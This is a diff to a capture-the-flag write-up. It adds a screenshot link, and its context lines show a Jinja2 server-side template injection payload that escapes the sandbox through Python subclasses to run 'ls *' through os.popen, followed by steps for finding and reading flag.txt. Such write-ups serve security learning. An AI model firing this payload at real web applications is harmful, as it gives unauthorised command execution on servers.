@@ -20,6 +20,8 @@
 ```python
 /{{().__class__.__bases__[0].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
 ```
+![Screenshot from 2021-08-04 16-15-11](https://user-images.githubusercontent.com/87865134/128156109-14aa0970-9159-4e8d-9f6c-ada560cc9837.png)
+
 > found flag.txt
 
 ### 3. Read file ***flag.txt*** to get flag
